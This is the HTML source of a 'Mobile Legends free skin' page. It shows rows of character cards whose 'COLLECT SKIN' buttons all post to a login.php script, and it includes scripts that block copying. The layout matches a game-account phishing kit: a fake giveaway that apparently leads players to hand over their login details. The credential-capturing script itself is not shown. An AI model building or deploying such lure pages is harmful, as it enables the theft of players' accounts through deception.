<!DOCTYPE html>
<html>
<script type='text/javascript'>
//<![CDATA[
document.addEventListener('copy', function (e){
    e.preventDefault();
  e.clipboardData.setData("text/plain", "Jangan Copas Gan :) "+window.location.href+"");
})
//]]>
</script>
<head>
    <meta charset="UTF-8">
    <title>MOBILE LEGENDS - FREE SKIN</title>
    <link rel="stylesheet" href="ccss/style.css">
    <link rel="shortcut icon" href="http://apk.pcfavour.info/wp-content/uploads/2016/10/Mobile-Legends-Game-APK-Android-Download-logo-icon.png"/>
</head>
<script type='text/javascript'>
//<![CDATA[
document.addEventListener('copy', function (e){
    e.preventDefault();
  e.clipboardData.setData("text/plain", "Jangan Copas Gan :) "+window.location.href+"");
})
//]]>
</script>
<body>
       <center><img style="width: 300px; height:500px;" src="Ggg.jpg" /></center><br>
                <span class="name"></span>
</div>
            </form>
    </div>
    
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/01.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color:white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
       
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/1.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
      
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/2.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
       
        </div>
    </div>

    
    <div id="pricing">
            </div>
            </from>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/3.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
       
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="gam/4.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
     
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/5.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
       
        </div>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/6.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
      
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/7.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
          
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/8.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
      
        </div>
    </div>
    
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/9.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
    
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/10.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
       
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/11.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
   
        </div>
    </div>
    
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/12.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
  
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/13.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
     
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/14.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="COLLECT SKIN" class="tombol"/>
            </form>
          
        </div>
    </div>
            </form>
      
            </form>
        </div>
    </div>
    
</html>